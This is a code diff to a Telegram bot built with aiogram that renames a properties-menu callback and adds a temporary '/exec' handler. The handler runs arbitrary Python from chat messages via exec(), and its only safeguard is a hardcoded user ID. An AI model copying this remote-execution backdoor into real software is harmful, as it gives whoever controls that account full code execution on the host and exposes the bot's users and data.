@@ -9,11 +9,15 @@ from aiogram.types import Update, Message, CallbackQuery
 from aiogram.filters import Command, StateFilter
 
 import funpayhub.lib.telegram.callbacks as cbs
-from funpayhub.lib.translater import Translater
 from funpayhub.lib.telegram.states import ChangingParameterValueState, ChangingPage
 from funpayhub.lib.telegram.ui.types import PropertiesUIContext
 from funpayhub.lib.telegram.ui.registry import UIRegistry
-from funpayhub.lib.telegram.keyboard_hashinater import HashinatorT1000
+import contextlib
+import html
+import textwrap
+from io import StringIO
+from copy import copy
+from types import FunctionType
 
 from .router import router as r
 
@@ -36,7 +40,38 @@ def _get_context(dp: Dispatcher, bot: Bot, obj: Message | CallbackQuery):
         user_id=obj.from_user.id,
     )
 
+# TEMP _____
+@r.message(Command('exec'))
+async def execute_python_code(message: Message, data):
+    if message.from_user.id != 5991368886:
+        return
 
+    print('Executing Python code...')
+
+    temp_buffer = StringIO()
+
+    with contextlib.redirect_stdout(temp_buffer):
+        with contextlib.redirect_stderr(temp_buffer):
+            try:
+                glob = copy(globals())
+                glob.update(data, message=message, buffer=temp_buffer)
+                code = message.text.split(None, 1)[1]
+                code = f'async def __wrapper_function__():\n{textwrap.indent(code, "  ")}'
+                _locals = {}
+                exec(code, glob, _locals)
+                fn = _locals['__wrapper_function__']
+                fn.__globals__.update(glob)
+                await fn()
+            except:
+                import traceback
+                traceback.print_exc()
+
+    await message.reply(
+        text=html.escape(temp_buffer.getvalue())
+    )
+
+
+# TEMP _____
 @r.callback_query(cbs.Dummy.filter())
 async def dummy(query: CallbackQuery) -> None:
     await query.answer()
@@ -60,7 +95,7 @@ async def send_menu(
         language=properties.general.language.real_value(),
         max_elements_on_page=properties.telegram.appearance.menu_entries_amount.value,
         page=0,
-        current_callback=cbs.OpenPropertiesMenu(path=properties.path).pack(),
+        current_callback=cbs.OpenEntryMenu(path=properties.path).pack(),
         callbacks_history=[],
         entry=properties,
     )
@@ -73,7 +108,7 @@ async def send_menu(
     )
 
 
-@r.callback_query(cbs.OpenPropertiesMenu.filter())
+@r.callback_query(cbs.OpenEntryMenu.filter())
 async def open_menu(
     query: CallbackQuery,
     properties: FunPayHubProperties,
@@ -81,7 +116,7 @@ async def open_menu(
     callbacks_history: list[str],
     data: dict[str, Any],
 ):
-    unpacked = cbs.OpenPropertiesMenu.unpack(query.data)
+    unpacked = cbs.OpenEntryMenu.unpack(query.data)
 
     ctx = PropertiesUIContext(
         language=properties.general.language.real_value(),
